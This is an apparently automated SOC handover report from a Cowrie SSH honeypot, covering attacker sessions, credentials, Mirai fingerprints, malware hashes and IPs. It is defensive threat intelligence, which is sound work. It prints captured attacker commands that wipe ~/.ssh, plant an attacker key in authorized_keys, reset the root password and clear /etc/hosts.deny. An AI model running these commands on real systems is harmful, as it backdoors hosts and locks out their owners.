# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T23:05:12Z |
| **Shift Time** | 23:05 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **32** |
| Confirmed Threats | **29** |
| False Positives Filtered | **3** (9.4%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **9** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **28** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **9** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **5** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 2 |
| `sammy` | 1 |
| `bodega` | 1 |
| `develop` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 2 |
| `1234` | 1 |
| `123456` | 1 |
| `develop` | 1 |
| `` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `sammy` | `1234` | 1 |
| `bodega` | `123456` | 1 |
| `develop` | `develop` | 1 |
| `root` | `` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `176.65.139.161` | 2026-05-22T22:15:56 |
| `root` | `Admin@123$` | `186.146.235.58` | 2026-05-22T22:31:36 |
| `root` | `3245gs5662d34` | `186.146.235.58` | 2026-05-22T22:31:43 |
| `root` | `12345@Admin` | `101.126.54.23` | 2026-05-22T22:36:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **32** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 18 | 7 |
| `03a80b21afa8...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 18 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:iqX25PwTHOXu"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.54.23`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.139.161`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.146.235.58`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **13** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS134420` | Chongqing Telecom | 1 | HIGH |
| `AS14080` | Telmex Colombia S.A. | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS30844` | Liquid Telecommunications Ltd | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-54e948fc01c9

| Field | Detail |
|---|---|
| **Source IP** | `176.65.139[.]161` |
| **First Seen** | 2026-05-22 22:15 |
| **Last Seen** | 2026-05-22 22:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 22:15:56` | `cowrie.session.connect` |
| `2026-05-22 22:15:56` | `cowrie.login.success` |
| `2026-05-22 22:15:57` | `cowrie.session.params` |
| `2026-05-22 22:15:57` | `cowrie.command.input` |
| `2026-05-22 22:15:58` | `cowrie.command.input` |
| `2026-05-22 22:15:59` | `cowrie.command.input` |
| `2026-05-22 22:16:00` | `cowrie.command.input` |
| `2026-05-22 22:16:00` | `cowrie.command.failed` |
| `2026-05-22 22:16:01` | `cowrie.log.closed` |
| `2026-05-22 22:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.65.139[.]161` to AbuseIPDB if not already reported
- [ ] Block `176.65.139[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dad44087b277

| Field | Detail |
|---|---|
| **Source IP** | `186.146.235[.]58` |
| **First Seen** | 2026-05-22 22:31 |
| **Last Seen** | 2026-05-22 22:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 22:31:34` | `cowrie.session.connect` |
| `2026-05-22 22:31:34` | `cowrie.client.version` |
| `2026-05-22 22:31:34` | `cowrie.client.kex` |
| `2026-05-22 22:31:36` | `cowrie.login.success` |
| `2026-05-22 22:31:36` | `cowrie.session.params` |
| `2026-05-22 22:31:36` | `cowrie.command.input` |
| `2026-05-22 22:31:36` | `cowrie.command.failed` |
| `2026-05-22 22:31:37` | `cowrie.log.closed` |
| `2026-05-22 22:31:37` | `cowrie.session.params` |
| `2026-05-22 22:31:37` | `cowrie.command.input` |
| `2026-05-22 22:31:38` | `cowrie.session.file_download` |
| `2026-05-22 22:31:38` | `cowrie.log.closed` |
| `2026-05-22 22:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.146.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `186.146.235[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c114fa126c0

| Field | Detail |
|---|---|
| **Source IP** | `186.146.235[.]58` |
| **First Seen** | 2026-05-22 22:31 |
| **Last Seen** | 2026-05-22 22:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 22:31:41` | `cowrie.session.connect` |
| `2026-05-22 22:31:41` | `cowrie.client.version` |
| `2026-05-22 22:31:42` | `cowrie.client.kex` |
| `2026-05-22 22:31:43` | `cowrie.login.success` |
| `2026-05-22 22:31:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.146.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `186.146.235[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b21369a752

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]23` |
| **First Seen** | 2026-05-22 22:36 |
| **Last Seen** | 2026-05-22 22:37 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:iqX25PwTHOXu"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 22:36:47` | `cowrie.session.connect` |
| `2026-05-22 22:36:47` | `cowrie.client.version` |
| `2026-05-22 22:36:47` | `cowrie.client.kex` |
| `2026-05-22 22:36:48` | `cowrie.login.success` |
| `2026-05-22 22:36:49` | `cowrie.session.params` |
| `2026-05-22 22:36:49` | `cowrie.command.input` |
| `2026-05-22 22:36:49` | `cowrie.command.failed` |
| `2026-05-22 22:36:49` | `cowrie.log.closed` |
| `2026-05-22 22:36:49` | `cowrie.session.params` |
| `2026-05-22 22:36:49` | `cowrie.command.input` |
| `2026-05-22 22:36:49` | `cowrie.session.file_download` |
| `2026-05-22 22:36:49` | `cowrie.log.closed` |
| `2026-05-22 22:37:07` | `cowrie.session.params` |
| `2026-05-22 22:37:07` | `cowrie.command.input` |
| `2026-05-22 22:37:07` | `cowrie.log.closed` |
| `2026-05-22 22:37:07` | `cowrie.session.params` |
| `2026-05-22 22:37:07` | `cowrie.command.input` |
| `2026-05-22 22:37:08` | `cowrie.log.closed` |
| `2026-05-22 22:37:08` | `cowrie.session.params` |
| `2026-05-22 22:37:08` | `cowrie.command.input` |
| `2026-05-22 22:37:08` | `cowrie.session.file_download` |
| `2026-05-22 22:37:08` | `cowrie.log.closed` |
| `2026-05-22 22:37:09` | `cowrie.session.params` |
| `2026-05-22 22:37:09` | `cowrie.command.input` |
| `2026-05-22 22:37:09` | `cowrie.log.closed` |
| `2026-05-22 22:37:09` | `cowrie.session.params` |
| `2026-05-22 22:37:09` | `cowrie.command.input` |
| `2026-05-22 22:37:10` | `cowrie.log.closed` |
| `2026-05-22 22:37:10` | `cowrie.session.params` |
| `2026-05-22 22:37:10` | `cowrie.command.input` |
| `2026-05-22 22:37:10` | `cowrie.command.input` |
| `2026-05-22 22:37:10` | `cowrie.log.closed` |
| `2026-05-22 22:37:10` | `cowrie.session.params` |
| `2026-05-22 22:37:10` | `cowrie.command.input` |
| `2026-05-22 22:37:11` | `cowrie.log.closed` |
| `2026-05-22 22:37:11` | `cowrie.session.params` |
| `2026-05-22 22:37:11` | `cowrie.command.input` |
| `2026-05-22 22:37:12` | `cowrie.log.closed` |
| `2026-05-22 22:37:12` | `cowrie.session.params` |
| `2026-05-22 22:37:12` | `cowrie.command.input` |
| `2026-05-22 22:37:13` | `cowrie.log.closed` |
| `2026-05-22 22:37:13` | `cowrie.session.params` |
| `2026-05-22 22:37:13` | `cowrie.command.input` |
| `2026-05-22 22:37:13` | `cowrie.log.closed` |
| `2026-05-22 22:37:13` | `cowrie.session.params` |
| `2026-05-22 22:37:13` | `cowrie.command.input` |
| `2026-05-22 22:37:14` | `cowrie.log.closed` |
| `2026-05-22 22:37:14` | `cowrie.session.params` |
| `2026-05-22 22:37:14` | `cowrie.command.input` |
| `2026-05-22 22:37:15` | `cowrie.log.closed` |
| `2026-05-22 22:37:15` | `cowrie.session.params` |
| `2026-05-22 22:37:15` | `cowrie.command.input` |
| `2026-05-22 22:37:16` | `cowrie.log.closed` |
| `2026-05-22 22:37:16` | `cowrie.session.params` |
| `2026-05-22 22:37:16` | `cowrie.command.input` |
| `2026-05-22 22:37:16` | `cowrie.log.closed` |
| `2026-05-22 22:37:17` | `cowrie.session.params` |
| `2026-05-22 22:37:17` | `cowrie.command.input` |
| `2026-05-22 22:37:17` | `cowrie.log.closed` |
| `2026-05-22 22:37:18` | `cowrie.session.params` |
| `2026-05-22 22:37:18` | `cowrie.command.input` |
| `2026-05-22 22:37:18` | `cowrie.log.closed` |
| `2026-05-22 22:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]23` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.126.141[.]163` | **9** | 2026-05-22 21:16 | 2026-05-22 21:39 | 16m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `129.146.181[.]168` | **3** | 2026-05-22 21:23 | 2026-05-22 21:43 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.11[.]137` | **2** | 2026-05-22 21:34 | 2026-05-22 21:38 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.54[.]23` | **2** | 2026-05-22 22:36 | 2026-05-22 22:38 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.49.238[.]104` | 1 | 2026-05-22 21:37 | 2026-05-22 21:37 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.249.112[.]97` | 1 | 2026-05-22 21:24 | 2026-05-22 21:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.77[.]176` | 1 | 2026-05-22 21:33 | 2026-05-22 21:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `161.35.217[.]121` | 1 | 2026-05-22 22:16 | 2026-05-22 22:17 | 58s | 0 | `T1592` | 🟢 LOW |
| `176.65.139[.]161` | 1 | 2026-05-22 22:15 | 2026-05-22 22:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.98[.]88` | 1 | 2026-05-22 21:29 | 2026-05-22 21:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.146.235[.]58` | 1 | 2026-05-22 22:31 | 2026-05-22 22:31 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `216.16.128[.]182` | 1 | 2026-05-22 22:42 | 2026-05-22 22:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `41.175.29[.]186` | 1 | 2026-05-22 21:59 | 2026-05-22 21:59 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `113.249.112[.]97` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 1 |
| `176.65.139[.]161` | NL | Storm Industries | **100** ⚠️ | 28 |
| `41.175.29[.]186` | ZM | Liquid Telecommunications Operations Limited | **100** ⚠️ | 1 |
| `216.16.128[.]182` | US | Cox Communications Inc. | **100** ⚠️ | 36 |
| `120.48.77[.]176` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 23 |
| `186.146.235[.]58` | CO | Telmex Colombia S.A. | **100** ⚠️ | 17 |
| `103.49.238[.]104` | ID | PT Cloud Hosting Indonesia | **100** ⚠️ | 50 |
| `101.126.141[.]163` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 21 |
| `101.126.54[.]23` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.126.11[.]137` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 20 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 5 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 32 cases |
| Tool 34  | Credential Extractor        | ✅ 9 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (9.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 13 recon entry/entries in table (4 group(s) consolidating 16 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T23:05:12Z_
